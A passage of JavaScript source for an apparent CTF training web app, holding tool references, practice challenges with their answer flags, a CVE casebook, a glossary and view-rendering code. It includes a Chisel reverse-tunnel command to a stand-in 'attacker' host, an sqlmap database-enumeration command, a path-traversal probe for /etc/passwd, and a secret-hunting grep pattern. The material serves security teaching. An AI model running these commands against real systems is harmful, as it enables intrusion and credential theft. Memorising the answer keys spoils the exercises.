    ['API-first systems','Mobile/cloud CTFs frequently reduce to API discovery + authorization + data-flow reasoning.','Reuse the web/API methodology instead of learning a separate universe.']
   ],practice:['Run a local containerized vulnerable web app.','Inspect a toy JSON API and identify authorization boundaries.']},
  {id:'blue-team',icon:'12',name:'Detection + Blue Team Context',level:'Cross-cutting',duration:'8–14 h',summary:'Turn CTF offensive clues into defender knowledge: telemetry, triage, detection engineering and ATT&CK mapping.',
   concepts:[
    ['Telemetry','Security events come from endpoints, identity systems, DNS, proxies, applications and network sensors.','Ask which sensor could prove or disprove a hypothesis.'],
    ['Triage','Triage is a prioritization problem: what happened, where, when, and what evidence is trustworthy?','Write a 6-line incident summary from synthetic logs.'],
    ['ATT&CK mapping','Tactics answer "why"; techniques answer "how". Mapping helps communicate behavior without relying on vendor names.','Map a solved challenge to one or two ATT&CK techniques where appropriate.'],
    ['Detection logic','Good detections describe observable behavior and constrain false positives.','State data source, condition, context and response.'],
    ['Recovery thinking','A CTF flag is not the end of a real incident. Defenders care about containment, eradication, recovery and lessons learned.','Write the defender action after every offensive lab.']
   ],practice:['Map the incident-triage challenge to ATT&CK.','Use NIST CSF 2.0 as a high-level risk-management lens.']}
];

const tools = [
  {name:'Burp Suite Community',cat:'Web / Proxy',why:'The industry-standard intercepting proxy for mapping web attack surfaces, testing SQLi/XSS/SSRF, and replaying modified HTTP/S requests.',linux:'burpsuite',windows:'burpsuite.exe',mac:'open -a Burp\ Suite\ Community\ Edition',url:'https://portswigger.net/burp'},
  {name:'OWASP ZAP',cat:'Web / Scanner',why:'Feature-rich open-source proxy and automated security scanner without rate limits or commercial paywalls on fuzzing.',linux:'zap.sh',windows:'zaproxy.exe',mac:'open /Applications/OWASP\ ZAP.app',url:'https://www.zaproxy.org/'},
  {name:'ffuf',cat:'Web / Discovery',why:'Blazing-fast web fuzzer written in Go. Indispensable for discovering hidden files, directories, virtual hosts, and API parameters.',linux:'ffuf -u http://127.0.0.1:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',windows:'ffuf.exe -u http://127.0.0.1:8000/FUZZ -w wordlist.txt',mac:'ffuf -u http://127.0.0.1:8000/FUZZ -w wordlist.txt',url:'https://github.com/ffuf/ffuf'},
  {name:'sqlmap',cat:'Web / Database',why:'Automated SQL injection detection and database takeover tool. Supports boolean, time-based, error, and UNION extraction.',linux:'sqlmap -u "http://127.0.0.1/item?id=1" --batch --dbs',windows:'python sqlmap.py -u "http://127.0.0.1/item?id=1" --batch --dbs',mac:'sqlmap -u "http://127.0.0.1/item?id=1" --batch --dbs',url:'https://sqlmap.org/'},
  {name:'Ghidra',cat:'Reverse Engineering',why:'NSA software reverse engineering suite with powerful multi-architecture Sleigh decompiler, P-Code IR, and binary patching.',linux:'./ghidraRun',windows:'ghidraRun.bat',mac:'./ghidraRun',url:'https://github.com/NationalSecurityAgency/ghidra'},
  {name:'GDB + GEF',cat:'Pwn / Debugging',why:'GNU Debugger enhanced with GEF (GDB Enhanced Features) for exploit developers: telescope, pattern create/offset, checksec, heap.',linux:'gdb -q ./binary',windows:'gdb ./binary (via WSL2)',mac:'lldb ./binary',url:'https://gef.blah.cat/'},
  {name:'pwntools',cat:'Pwn / Automation',why:'Essential Python CTF exploit development library providing cyclic patterns, ELF parsing, ROP generation, and socket I/O.',linux:'python3 -m pip install --user pwntools',windows:'python -m pip install --user pwntools (WSL)',mac:'python3 -m pip install --user pwntools',url:'https://docs.pwntools.com/'},
  {name:'Z3 Theorem Prover',cat:'Reverse / Crypto',why:'High-performance SMT solver by Microsoft Research. Inverts complex bitwise XOR, modular arithmetic, and constraint systems.',linux:'python3 -m pip install z3-solver',windows:'python -m pip install z3-solver',mac:'python3 -m pip install z3-solver',url:'https://github.com/Z3Prover/z3'},
  {name:'Nmap',cat:'Network Recon',why:'Network discovery, active port scanning, OS fingerprinting, and NSE vulnerability scanning.',linux:'nmap -sV -sC -p- 127.0.0.1',windows:'nmap -sV -sC -p- 127.0.0.1',mac:'nmap -sV -sC -p- 127.0.0.1',url:'https://nmap.org/book/'},
  {name:'Wireshark',cat:'Network / Forensics',why:'Interactive deep packet inspection, TCP stream reassembly, TLS session decryption, and protocol dissection.',linux:'wireshark',windows:'wireshark.exe',mac:'open /Applications/Wireshark.app',url:'https://www.wireshark.org/docs/wsug_html/'},
  {name:'tcpdump',cat:'Network / CLI',why:'Lightweight command-line packet sniffer for raw PCAP capture and protocol filtering.',linux:'tcpdump -i any -nn -s0 -w capture.pcap',windows:'Use Wireshark/Npcap',mac:'sudo tcpdump -i en0 -w capture.pcap',url:'https://www.tcpdump.org/'},
  {name:'curl',cat:'Web / Automation',why:'Swiss-army knife for raw HTTP requests, custom headers, cookies, proxies, and multi-part data submission.',linux:'curl -i -X POST -d "param=val" http://127.0.0.1/',windows:'curl.exe -i -X POST -d "param=val" http://127.0.0.1/',mac:'curl -i -X POST -d "param=val" http://127.0.0.1/',url:'https://curl.se/docs/'},
  {name:'CyberChef',cat:'Encoding / Crypto',why:'The Cyber Swiss Army Knife for multi-stage decoding, hashing, compression, de-obfuscation, and data manipulation.',linux:'Open web app or: docker run -p 8080:80 mpepping/cyberchef',windows:'Open web app in browser',mac:'Open web app in browser',url:'https://gchq.github.io/CyberChef/'},
  {name:'John the Ripper',cat:'Crypto / Passwords',why:'Fast password hash cracker supporting hundreds of hash formats, custom mutation rules, and encrypted archives.',linux:'john --wordlist=rockyou.txt hashes.txt',windows:'john.exe --wordlist=rockyou.txt hashes.txt',mac:'john --wordlist=rockyou.txt hashes.txt',url:'https://www.openwall.com/john/'},
  {name:'hashcat',cat:'Crypto / GPU',why:'World fastest GPU-accelerated hash recovery utility supporting rule-based attacks, mask brute-force, and hybrid modes.',linux:'hashcat -m 0 -a 0 hashes.txt rockyou.txt',windows:'hashcat.exe -m 0 -a 0 hashes.txt rockyou.txt',mac:'hashcat -m 0 -a 0 hashes.txt rockyou.txt',url:'https://hashcat.net/hashcat/'},
  {name:'Binwalk',cat:'Forensics / Firmware',why:'Firmware analysis tool to scan raw binary images, identify embedded compressed file systems, and extract archives.',linux:'binwalk -Me firmware.bin',windows:'Use WSL2 / Docker',mac:'binwalk -Me firmware.bin',url:'https://github.com/ReFirmLabs/binwalk'},
  {name:'Volatility 3',cat:'Forensics / Memory',why:'Advanced memory forensics framework for analyzing volatile RAM dumps (processes, DLLs, network sockets, rootkits).',linux:'python3 vol.py -f memdump.raw windows.pslist',windows:'python vol.py -f memdump.raw windows.pslist',mac:'python3 vol.py -f memdump.raw windows.pslist',url:'https://github.com/volatilityfoundation/volatility3'},
  {name:'steghide & zsteg',cat:'Steganography',why:'Steghide extracts data hidden in JPEG/BMP/WAV files; zsteg scans PNG/BMP for LSB data across color channels.',linux:'steghide extract -sf image.jpg; zsteg -a image.png',windows:'Use WSL2 or steghide.exe',mac:'steghide extract -sf image.jpg; zsteg -a image.png',url:'https://github.com/zed-0xff/zsteg'},
  {name:'exiftool',cat:'Forensics / OSINT',why:'Read, write, and manipulate EXIF, IPTC, and XMP metadata in images, PDFs, audio, and office documents.',linux:'exiftool -a -u -g1 image.jpg',windows:'exiftool.exe -a -u -g1 image.jpg',mac:'exiftool -a -u -g1 image.jpg',url:'https://exiftool.org/'},
  {name:'Impacket',cat:'Active Directory / Net',why:'Collection of Python classes for working with network protocols (SMB, Kerberos, MSRPC, LDAP) for Windows penetration testing.',linux:'python3 -m pip install impacket',windows:'python -m pip install impacket',mac:'python3 -m pip install impacket',url:'https://github.com/fortra/impacket'},
  {name:'Chisel',cat:'Pivoting / Tunneling',why:'Fast TCP/UDP tunnel over HTTP secured via SSH. Essential for pivoting through compromised CTF pivot hosts to internal subnets.',linux:'chisel server --port 8000 --reverse',windows:'chisel.exe client attacker:8000 R:socks',mac:'chisel server --port 8000 --reverse',url:'https://github.com/jpillora/chisel'},
  {name:'ripgrep (rg)',cat:'CLI / Search',why:'Lightning-fast recursive grep honoring .gitignore. Instant discovery of hardcoded flags, credentials, and API routes.',linux:'rg -n -i "flag{|password|secret" .',windows:'rg.exe -n -i "flag{|password|secret" .',mac:'rg -n -i "flag{|password|secret" .',url:'https://github.com/BurntSushi/ripgrep'}
];

const challenges = [
  {id:'b64',name:'Decode the postcard',cat:'Encoding',diff:'Warm-up',points:50,prompt:'Decode this Base64 string: ZmxhZ3tGSVJTVF9TVEVQfQ==',hint:['This is representation, not encryption.','Base64 decoders are built into most languages.'],answer:'flag{FIRST_STEP}',why:'Build the habit of testing simple encodings before trying exotic techniques.'},
  {id:'hex',name:'Hex trail',cat:'Encoding',diff:'Warm-up',points:50,prompt:'Hex bytes: 66 6c 61 67 7b 48 45 58 5f 49 54 7d',hint:['Group into bytes and map to ASCII.','Python: bytes.fromhex(...).decode()'],answer:'flag{HEX_IT}',why:'Byte representations are foundational to forensics and crypto.'},
  {id:'caesar',name:'Shifted note',cat:'Crypto',diff:'Easy',points:75,prompt:'Caesar-shifted note (shift +3): Iodj{FDHVDU_3}',hint:['To decrypt, move letters backwards.','Keep punctuation and digits unchanged.'],answer:'flag{CAESAR_3}',why:'Cipher recognition comes before brute-force tooling.'},
  {id:'xor',name:'One-byte XOR',cat:'Crypto',diff:'Easy',points:100,prompt:'Cipher bytes (hex): 0f 05 08 0e 12 31 26 3b 36 22 2c 30 14. Key = 0x69. Decode to text.',hint:['XOR each byte with the same key.','The XOR operation is reversible: x ^ k ^ k = x.'],answer:'flag{XOR_KEY}',why:'CTF crypto often expects you to reason at the byte level.'},
  {id:'url',name:'Encoded endpoint',cat:'Web',diff:'Easy',points:75,prompt:'Decode: /api%2Fv1%2Fusers%3Frole%3Dadmin',hint:['Percent-encoding represents bytes/characters in URLs.','Decode only the URL-encoded layer first.'],answer:'/api/v1/users?role=admin',why:'Seeing the real request path is essential in API testing.'},
  {id:'jwt',name:'JWT payload',cat:'Web / API',diff:'Easy',points:100,prompt:'Decode the payload segment of eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.',hint:['JWT has dot-separated segments; the middle is Base64URL JSON.','Do not treat a decoded token as proof that a token is trustworthy.'],answer:'{"user":"alice","role":"user"}',why:'Separating token encoding from token validation prevents common reasoning mistakes.'},
  {id:'log',name:'Find the suspicious line',cat:'Forensics',diff:'Easy',points:100,prompt:'Which event is most suspicious?\n10:12:03 GET /health 200\n10:12:04 GET /static/app.js 200\n10:12:06 POST /login 401\n10:12:08 GET /../../etc/passwd 400\n10:12:10 GET /dashboard 200',hint:['Look for an input that attempts path traversal.','A 400 can still be meaningful evidence of probing.'],answer:'10:12:08 GET /../../etc/passwd 400',why:'Detection is about behavior and context, not only successful exploitation.'},
  {id:'subnet',name:'Network boundary',cat:'Networking',diff:'Medium',points:100,prompt:'Host 10.10.14.23/24: what is the network address?',hint:['/24 means 24 network bits.','The final octet becomes 0 for the network address.'],answer:'10.10.14.0',why:'Subnet reasoning supports scanning, routing and incident triage.'},
  {id:'http',name:'HTTP status reasoning',cat:'Web',diff:'Medium',points:100,prompt:'A server returns 401 to /api/me before login and 403 to /api/admin after login as a normal user. What is the best interpretation?',hint:['401 generally indicates missing/invalid authentication.','403 generally indicates the server understood the request but refuses it.'],answer:'401 means unauthenticated; 403 means authenticated but not authorized',why:'Precise terminology helps you test the right trust boundary.'},
  {id:'elf',name:'ELF clue',cat:'Reverse',diff:'Medium',points:125,prompt:'A binary has a section named .text and another named .rodata. Which is the best mental model?',hint:['Executable code is usually in .text.','Read-only constants/strings are commonly in .rodata.'],answer:'Code in .text; read-only constants/data in .rodata',why:'Executable layout gives you a map before disassembly.'},
  {id:'endianness',name:'Byte order',cat:'Reverse',diff:'Medium',points:100,prompt:'Interpret bytes 78 56 34 12 as a 32-bit little-endian integer.',hint:['Little-endian stores the least significant byte first.','Reverse the byte order for the human-readable hex value.'],answer:'0x12345678',why:'Endianness appears constantly in binary parsing and exploit development.'},
  {id:'regex',name:'Extract the ticket',cat:'Automation',diff:'Medium',points:125,prompt:'From "INFO ticket=ABC-2417 user=demo" extract only the ticket value.',hint:['Pattern: ticket=([A-Z]+-[0-9]+).','Use a capture group.'],answer:'ABC-2417',why:'Regex is a force multiplier for repeatable evidence extraction.'},
  {id:'perm',name:'Permission math',cat:'Linux',diff:'Medium',points:100,prompt:'What permissions does 640 grant on a file?',hint:['6 = rw-, 4 = r--, 0 = ---.','Order is owner, group, other.'],answer:'owner rw-, group r--, other ---',why:'Permissions are easier once you translate the octal digits consistently.'},
  {id:'assembly',name:'Branch meaning',cat:'Reverse',diff:'Medium',points:125,prompt:'Pseudo-assembly: cmp eax, 42; jne fail; call success. What must be true to reach success?',hint:['jne means jump if not equal.','So the call occurs when the comparison finds equality.'],answer:'eax == 42',why:'Reverse engineering starts with control-flow truth tables, not decompiler magic.'},
  {id:'stego',name:'Container clue',cat:'Stego / Forensics',diff:'Medium',points:100,prompt:'A PNG is 120 KB on disk, has valid PNG headers, and contains a large ZIP archive appended after the IEND chunk. What should you test first?',hint:['Do not assume the PNG itself is corrupted.','Treat the trailing bytes as a second artifact and inspect/extract them.'],answer:'Inspect/extract the trailing ZIP data',why:'Compound-file thinking solves many "mystery image" challenges.'},
  {id:'osint',name:'Provenance first',cat:'OSINT',diff:'Hard',points:150,prompt:'A screenshot claims a software project released version 9.2 on March 3, but the project\'s signed release page says version 9.1 on March 5. What should you do before concluding the screenshot is false?',hint:['Corroborate with another primary source, such as tags, release notes or repository history.','Check timezone/date conventions and whether the screenshot refers to a fork or pre-release.'],answer:'Corroborate with primary release artifacts and check context',why:'Strong OSINT separates observation, verification and inference.'},
  {id:'incident',name:'Map the behavior',cat:'Blue Team',diff:'Hard',points:150,prompt:'A lab endpoint shows repeated credential guessing followed by successful remote login and local process discovery. Which sequence best describes the behavior?',hint:['Think in behaviors rather than malware names.','ATT&CK tactics can form a sequence.'],answer:'Credential Access → Initial Access/Valid Accounts → Discovery',why:'CTF clues become more transferable when translated into defender language.'},
  {id:'method',name:'Choose the next move',cat:'Methodology',diff:'Hard',points:175,prompt:'You have a web app with an authenticated user and a numeric object ID in the URL. Which is the strongest next hypothesis to test in a local lab?',hint:['Authorization bugs often occur when object references are trusted without checking ownership.','Build two accounts and compare access to each other\'s objects.'],answer:'Test object-level authorization with two users',why:'Good CTF solving is hypothesis-driven and testable.'}
];

const casebook = [
  {title:'Heartbleed (CVE-2014-0160)',domain:'Crypto / Protocols',lesson:'A memory-safety bug in a TLS implementation became a global security problem because a security-critical parser crossed a memory boundary without sufficient validation.',study:['bounds checking','memory disclosure','patching and validation','why crypto primitives can still fail in implementation'],source:'https://nvd.nist.gov/vuln/detail/CVE-2014-0160'},
  {title:'Shellshock (CVE-2014-6271)',domain:'Linux / Command Injection',lesson:'Bash function parsing in environment variables created command-execution paths across trust boundaries in multiple configurations.',study:['environment variables','parser boundaries','command injection concepts','defensive patching and exposure mapping'],source:'https://nvd.nist.gov/vuln/detail/CVE-2014-6271'},
  {title:'Log4Shell (CVE-2021-44228)',domain:'Web / Java / Supply Chain',lesson:'A logging feature accepted attacker-controlled data that could trigger unexpected lookups, showing how "non-security" components can become attack surfaces.',study:['data-to-code boundaries','dependency inventory','egress controls','defense-in-depth'],source:'https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-339a'},
  {title:'MOVEit Transfer (CVE-2023-34362)',domain:'Web / SQL Injection',lesson:'A SQL injection issue in a widely deployed file-transfer product was actively exploited; the case demonstrates why input validation, rapid patching and monitoring matter together.',study:['SQL injection root cause','web input validation','asset exposure','threat detection and patch management'],source:'https://www.cisa.gov/known-exploited-vulnerabilities-catalog'},
  {title:'What the cases have in common',domain:'Cross-cutting',lesson:'Different technologies fail for recurring reasons: untrusted input crossing an interpreter boundary, insufficient validation, excessive trust, weak visibility, or delayed patching.',study:['trust boundaries','secure defaults','telemetry','defense in depth'],source:'https://attack.mitre.org/'}
];

const glossary = [
 ['ACL','Access Control List: explicit permissions attached to a resource beyond basic owner/group/other bits.'],
 ['ASLR','Address Space Layout Randomization: randomizes locations of memory regions to complicate reliable memory-corruption attacks.'],
 ['API','Application Programming Interface: a defined interface through which software components communicate.'],
 ['ASR','Attack Surface Reduction: limiting exposed functionality and execution paths to reduce opportunities for abuse.'],
 ['C2','Command and Control: communication used to remotely direct a compromised system; useful as a defensive concept.'],
 ['CTF','Capture The Flag: a competition or practice format where solvers find hidden tokens by applying security skills.'],
 ['ELF','Executable and Linkable Format: a common Unix-like binary object format.'],
 ['Entropy','A measure of unpredictability or information density; useful for identifying compressed/encrypted-looking data.'],
 ['Fuzzing','Systematically supplying varied or unexpected inputs to find crashes, parsing errors or logic flaws.'],
 ['JWT','JSON Web Token: a compact token format; its encoding is not itself proof of trust.'],
 ['LSB','Least Significant Bit: lowest-order bit; often discussed in steganography and binary operations.'],
 ['MITM','Man-in-the-Middle: a position where a party can observe or influence communication between endpoints.'],
 ['NAT','Network Address Translation: maps address/port information between network domains.'],
 ['PCAP','Packet Capture: a file containing captured network traffic.'],
 ['PIE','Position-Independent Executable: executable layout supporting randomized placement under ASLR.'],
 ['ROP','Return-Oriented Programming: composing existing instruction sequences to influence execution after memory corruption.'],
 ['SAST','Static Application Security Testing: analyzing code without running the application.'],
 ['TLS','Transport Layer Security: cryptographic protocol used to protect data in transit.'],
 ['TTL','Time To Live: a bounded lifetime field, used in several protocol/data contexts.'],
 ['WAF','Web Application Firewall: filters or blocks web traffic based on policies and observed request characteristics.']
];

/* ── Persistence helpers ─────────────────────────────────── */
function save() {
  localStorage.setItem('atlas-solved', JSON.stringify(state.solved));
  localStorage.setItem('atlas-domains', JSON.stringify(state.completedDomains));
  localStorage.setItem('atlas-os', state.os);
  localStorage.setItem('atlas-theme', state.theme);
  localStorage.setItem('atlas-module-query', state.moduleQuery);
}

function completion() { return Math.round((state.solved.length / challenges.length) * 100); }

function normalizeAnswer(s) { return String(s || '').toLowerCase().replace(/\s+/g, ' ').trim(); }

function setTheme() {
  const isLight = state.theme === 'light';
  document.documentElement.classList.toggle('light', isLight);
  const themeBtn = document.getElementById('themeToggle');
  if (themeBtn) {
    themeBtn.textContent = isLight ? 'CLEAN' : 'NEON';
    themeBtn.title = isLight ? 'Switch to Cyber Neon Dark Mode' : 'Switch to Clean Light Mode';
    themeBtn.setAttribute('aria-label', themeBtn.title);
  }
}

function setView(view) {
  if (!hasViewAccess(view)) {
    alert('This field is under development.');
    return;
  }
  state.view = view; state.domain = null; state.curriculumModule = null;
  document.querySelectorAll('.nav-item').forEach(b => b.classList.toggle('active', b.dataset.view === view));
  document.getElementById('breadcrumbs').textContent = {
    dashboard:'Dashboard', path:'Learning path', modules:'Learning modules', domains:'Learning paths',
    tools:'Tool Academy', labs:'Micro-labs', playbook:'Lifecycles & Playbook', casebook:'Casebook',
    library:'Reference vault', glossary:'Glossary', intel:'Live intel', curriculum:'Curriculum',
    tricks:'Tricks & tips', workbench:'Cyber workbench'
  }[view] || 'CTF Atlas';
  render();
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openDomain(id) {
  const d = domains.find(x => x.id === id);
  if (!d) return;
  if (!isAdvancedRole() && (d.id === 'reverse' || d.id === 'pwn')) {
    alert('This field is under development.');
    return;
  }
  state.view = 'domains'; state.domain = id;
  document.querySelectorAll('.nav-item').forEach(b => b.classList.toggle('active', b.dataset.view === 'domains'));
  document.getElementById('breadcrumbs').textContent = 'Domains / ' + d.name;
  render();
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function markDomain(id) {
  if (!state.completedDomains.includes(id)) state.completedDomains.push(id);
  save(); render();
}

window.setView = setView;
window.setTheme = setTheme;
window.openDomain = openDomain;
window.tricksHTML = tricksHTML;
window.modulesHTML = modulesHTML;

/* ── Main render dispatcher ──────────────────────────────── */
function render() {
  updateNavForRole();
  const view = document.getElementById('view');
  if (state.view === 'dashboard')   view.innerHTML = dashboardHTML();
  if (state.view === 'path')        view.innerHTML = pathHTML();
  if (state.view === 'modules')     view.innerHTML = modulesHTML(state.moduleQuery);
  if (state.view === 'domains')     view.innerHTML = state.domain ? domainDetailHTML(state.domain) : domainsHTML();
  if (state.view === 'tools')       view.innerHTML = toolsHTML();
  if (state.view === 'labs')        view.innerHTML = labsHTML();
  if (state.view === 'playbook')    view.innerHTML = playbookHTML();
  if (state.view === 'casebook')    view.innerHTML = casebookHTML();
  if (state.view === 'library')     view.innerHTML = libraryHTML();
  if (state.view === 'glossary')    view.innerHTML = glossaryHTML('');
  if (state.view === 'intel')       view.innerHTML = intelHTML(intelCache);
  if (state.view === 'curriculum')  view.innerHTML = curriculumHTML(intelCache);
  if (state.view === 'tricks')      view.innerHTML = tricksHTML();
  if (state.view === 'workbench')   view.innerHTML = workbenchHTML();
  bindViewEvents();
  if ((state.view === 'intel' || state.view === 'curriculum') && !intelCache) loadIntel();
  document.getElementById('sidebarProgress').textContent = completion() + '%';
  document.getElementById('sidebarProgressBar').style.width = completion() + '%';
  setTheme();
}

/* ══════════════════════════════════════════════════════════
 * CURRICULUM VIEW — Textbook-Grade Module Renderer
 * ══════════════════════════════════════════════════════════ */

function curriculumHTML(intel) {
  const isCadet = !isAdvancedRole();
  if (!intel) {
    return `<div class="section-head"><div><h2>Curriculum</h2>
      <p>Loading textbook-grade exploitation curriculum...</p></div></div>
      <div class="empty">⏳ Fetching curriculum data...</div>`;
  }

  const allModules = intel.curriculum || [];
  if (!allModules.length) {
    return `<div class="section-head"><div><h2>Curriculum</h2>
      <p>No curriculum modules loaded yet.</p></div></div>`;
  }

  /* Filter modules for cadet */
  const modules = isCadet
    ? allModules.filter(m => !(m.domain === 'reverse' || m.domain === 'pwn' || (m.id && (m.id.includes('pwn') || m.id.includes('reverse') || m.id.includes('binary-exploitation')))))
    : allModules;

  /* If a specific module is selected, render its full detail */
  if (state.curriculumModule) {
    const mod = modules.find(m => m.id === state.curriculumModule);
    if (mod) {
      return curriculumModuleDetailHTML(mod);
    }
    if (isCadet) {
      alert('This field is under development.');
    }
    state.curriculumModule = null;
  }

  /* Module listing grid */
  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">TEXTBOOK-GRADE CURRICULUM // ${modules.length} MODULES</div>
      <h2>Exploitation Curriculum</h2>
      <p>Production-quality deep-dives into core exploitation domains. Each module contains OS internals, attack mechanics, tool command references, real-world case studies, and a browser-native terminal lab.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">${modules.length} tracks</span>
      <span class="tag success">interactive labs</span>
      <span class="tag">textbook depth</span>
    </div>
  </div>

  <div class="grid cols-2">
    ${modules.map(mod => `
      <button class="card" data-curriculum-module="${esc(mod.id)}" style="text-align:left;min-height:260px">
        <div class="card-top">
          <div>
            <div class="domain-icon">${esc(mod.icon || '?')}</div>
            <h3>${esc(mod.title)}</h3>
          </div>
          <div class="arrow">→</div>
        </div>
        <p style="margin-top:8px">${esc(mod.abstract || '')}</p>
        <div class="tag-row" style="margin-top:10px">
          <span class="tag accent">${esc(mod.category || '')}</span>
          <span class="tag">${esc(mod.level || '')}</span>
          <span class="tag">${esc(mod.duration || '')}</span>
          ${mod.interactive_terminal_challenge && mod.interactive_terminal_challenge.flag
            ? (localStorage.getItem(`atlas-term-solved-${mod.interactive_terminal_challenge.id}`) === '1'
              ? '<span class="tag success">✓ Lab Solved</span>'
              : '<span class="tag warn">🖥 Lab Available</span>')
            : ''}
        </div>
      </button>`).join('')}
  </div>`;
}

function curriculumModuleDetailHTML(mod) {
  const theory   = mod.theory   || {};
  const tools    = mod.tools    || [];
  const impact   = mod.security_impact || null;
  const caseStudy = mod.case_study || null;
  const lab      = mod.interactive_terminal_challenge;

  /* ── Section 1: Abstract & Objectives ── */
  const abstractSection = `
  <div class="note" style="margin-bottom:24px">
    <strong style="color:var(--cyan);font-family:var(--display);letter-spacing:.08em;text-transform:uppercase">1. Module Abstract & Pedagogical Scope</strong><br>
    <p style="margin-top:8px;color:#cbd5e1;line-height:1.7">${esc(mod.abstract || '')}</p>
  </div>`;

  /* ── Section 2: Theory & Internals ── */
  const theorySections = (theory.sections || []).map(s => `
    <div style="margin-bottom:28px">
      <h3 style="font-family:var(--display);letter-spacing:.07em;text-transform:uppercase;color:var(--cyan);font-size:16px;margin-bottom:10px">${esc(s.heading)}</h3>
      <p style="color:#aeb6c5;line-height:1.8;margin-bottom:12px">${esc(s.body).replace(/\n/g,'<br>')}</p>
      ${s.code ? `<pre><code>${esc(s.code)}</code></pre>` : ''}
    </div>`).join('');

  const theorySection = `
  <div class="section-head"><div><div class="eyebrow">SECTION 02 // LOW-LEVEL INVARIANTS</div><h2>Systems & Protocol Internals</h2>
    <p>${esc(theory.title || '')}</p></div></div>
  <div class="detail" style="padding:28px;margin-bottom:24px">${theorySections}</div>`;

  /* ── Section 3: Security Impact & Defensive Detection ── */
  const impactSection = impact ? `
  <div class="section-head"><div><div class="eyebrow">SECTION 03 // BLUE TEAM CORRELATION</div><h2>Security Impact & Defensive Detection</h2>
    <p>Connecting offensive exploitation mechanics to detection engineering, audit telemetry, and remediation.</p></div></div>
  <div class="detail" style="padding:24px;margin-bottom:24px">
    <div class="tag-row" style="margin-bottom:16px">
      <span class="tag warn">ATT&amp;CK: ${esc(impact.att_ck || 'Tactic')}</span>
      <span class="tag accent">Sensor: Telemetry</span>
    </div>
    <div style="margin-bottom:16px">
      <h4 style="font-family:var(--display);color:var(--cyan);letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px">Kernel &amp; Sensor Telemetry</h4>
      <p style="color:#aeb6c5;line-height:1.7">${esc(impact.telemetry || '')}</p>
    </div>
    ${impact.detection_logic ? `
    <div style="margin-bottom:16px">
      <h4 style="font-family:var(--display);color:var(--green);letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px">Detection Logic / Rules (Auditd / YARA / Sigma)</h4>
      <pre><code>${esc(impact.detection_logic)}</code></pre>
    </div>` : ''}
    ${impact.hardening ? `
    <div style="margin-top:12px">
      <h4 style="font-family:var(--display);color:var(--amber);letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px">Defensive Hardening &amp; Invariant Remediation</h4>
      <p style="color:#aeb6c5;line-height:1.7">${esc(impact.hardening)}</p>
    </div>` : ''}
  </div>` : '';

  /* ── Section 4: Deep-Dive Tools & Techniques (CLI + GUI + Speed Guide) ── */
  const toolsSection = tools.length ? `
  <div class="section-head"><div><div class="eyebrow">SECTION 04 // OPERATIONAL CAPABILITIES</div><h2>Tool Deep-Dive &amp; Fast Execution (CLI &amp; GUI)</h2>
    <p>How to operate essential tools with maximum velocity in tournaments and audits.</p></div></div>
  ${tools.map(t => {
    const cli = t.cli_usage || (t.flags ? { flags: t.flags, syntax: t.name + ' [flags]', recipes: [] } : null);
    const gui = t.gui_usage || null;
    return `
    <div class="detail" style="margin-bottom:24px">
      <div class="detail-head" style="display:flex;justify-content:space-between;align-items:center">
        <div>
          <h3 style="margin:0;font-family:var(--display);text-transform:uppercase;letter-spacing:.08em;color:var(--green)">${esc(t.name)}</h3>
          <span style="font-size:12px;color:var(--muted)">${esc(t.category || 'Security Tool')}</span>
        </div>
        <div class="tag-row">
          ${cli ? '<span class="tag accent">CLI Available</span>' : ''}
          ${gui ? '<span class="tag success">GUI Available</span>' : ''}
        </div>
      </div>
      <div class="detail-body" style="padding:20px">
        ${t.speed_guide ? `
        <div class="note" style="margin-bottom:18px;border-left:3px solid var(--green)">
          <strong style="color:var(--green);font-family:var(--display);letter-spacing:.06em">⚡ HOW TO USE IT FAST (SPEED CHEATSHEET)</strong>
          <p style="margin-top:6px;color:#e2e8f0">${esc(t.speed_guide)}</p>
        </div>` : ''}

        ${cli ? `
        <div style="margin-bottom:20px">
          <h4 style="font-family:var(--display);color:var(--cyan);letter-spacing:.07em;text-transform:uppercase;font-size:14px;margin-bottom:10px">🖥️ Command-Line Interface (CLI) Operation</h4>
          ${cli.syntax ? `<div style="margin-bottom:10px"><code style="color:var(--cyan);font-size:13px">Syntax: ${esc(cli.syntax)}</code></div>` : ''}
          ${(cli.flags && cli.flags.length) ? `
          <table style="width:100%;border-collapse:collapse;font-size:13px;margin-bottom:14px">
            <thead>
              <tr style="border-bottom:1px solid var(--border)">
                <th style="text-align:left;padding:8px 12px;color:var(--cyan);font-family:var(--display);letter-spacing:.08em;text-transform:uppercase;width:35%">Flag / Parameter</th>
                <th style="text-align:left;padding:8px 12px;color:var(--cyan);font-family:var(--display);letter-spacing:.08em;text-transform:uppercase">Context &amp; Effect</th>
              </tr>
            </thead>
            <tbody>
              ${cli.flags.map((f, i) => `
                <tr style="border-bottom:1px dashed var(--border);background:${i%2?'#0d0d14':'transparent'}">
                  <td style="padding:8px 12px"><code style="color:var(--green);word-break:break-all">${esc(f.flag)}</code></td>
                  <td style="padding:8px 12px;color:#aeb6c5">${esc(f.context)}</td>
                </tr>`).join('')}
            </tbody>
          </table>` : ''}
          ${(cli.recipes && cli.recipes.length) ? `
          <div style="margin-top:10px">
            <span style="font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;font-weight:bold">Offensive Command Recipes:</span>
            ${cli.recipes.map(r => `<pre style="margin-top:6px"><code>${esc(r)}</code></pre>`).join('')}
          </div>` : ''}
        </div>` : ''}

        ${gui ? `
        <div style="margin-top:20px;padding-top:16px;border-top:1px dashed var(--border)">
          <h4 style="font-family:var(--display);color:var(--amber);letter-spacing:.07em;text-transform:uppercase;font-size:14px;margin-bottom:8px">🖱️ Graphical User Interface (GUI) Operation</h4>
          <p style="color:#aeb6c5;margin-bottom:10px;line-height:1.7">${esc(gui.overview || '')}</p>
          ${gui.fast_shortcuts ? `
          <div class="note warn-note" style="margin-bottom:12px">
            <strong>GUI Speed Shortcuts:</strong> ${esc(gui.fast_shortcuts)}
          </div>` : ''}
